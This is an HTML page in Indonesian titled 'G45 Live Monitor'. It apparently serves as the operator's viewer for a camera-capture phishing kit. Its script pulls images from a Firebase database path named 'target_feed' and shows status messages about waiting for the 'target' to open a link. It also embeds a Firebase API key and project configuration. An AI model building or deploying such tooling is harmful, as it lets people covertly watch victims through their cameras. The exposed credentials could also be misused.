<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>G45 Live Monitor</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body, html { width: 100%; height: 100%; background: #000; overflow: hidden; display: flex; justify-content: center; align-items: center; }
        
        #monitor {
            width: 100%;
            height: 100%;
            object-fit: contain;
            background: #000;
            transform: scaleX(-1); /* Efek mirror agar pas */
        }

        #status {
            position: fixed;
            top: 15px;
            left: 15px;
            background: rgba(0,0,0,0.8);
            color: #00ff00;
            font-family: monospace;
            padding: 6px 12px;
            border-radius: 4px;
            font-size: 12px;
            border: 1px solid #00ff00;
            z-index: 10;
        }
    </style>
</head>
<body>
    <div id="status">STATUS: MENUNGGU KONEKSI TARGET...</div>
    <img id="monitor" alt="Menunggu stream target..." />

    <!-- Firebase SDK v9 Modular -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBc4gDdIRxCR6H7RGBe7ejLyI6SrIRyxo0",
            authDomain: "haij-4beb7.firebaseapp.com",
            databaseURL: "https://haij-4beb7-default-rtdb.firebaseio.com",
            projectId: "haij-4beb7",
            storageBucket: "haij-4beb7.firebasestorage.app",
            messagingSenderId: "843252587335",
            appId: "1:843252587335:android:438d0f98d2a2505c034a62"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const monitorImg = document.getElementById('monitor');
        const statusDiv = document.getElementById('status');

        // Mendengarkan data masuk secara real-time dari Firebase
        onValue(ref(db, 'live_stream/target_feed'), (snapshot) => {
            const data = snapshot.val();
            if (data && data.image) {
                monitorImg.src = data.image;
                statusDiv.innerText = "STATUS: TERHUBUNG (LIVE STREAMING AKTIF)";
                statusDiv.style.color = "#00ff00";
                statusDiv.style.borderColor = "#00ff00";
            } else {
                statusDiv.innerText = "STATUS: MENUNGGU TARGET MEMBUKA LINK...";
                statusDiv.style.color = "#ff4444";
                statusDiv.style.borderColor = "#ff4444";
            }
        });
    </script>
</body>
</html>
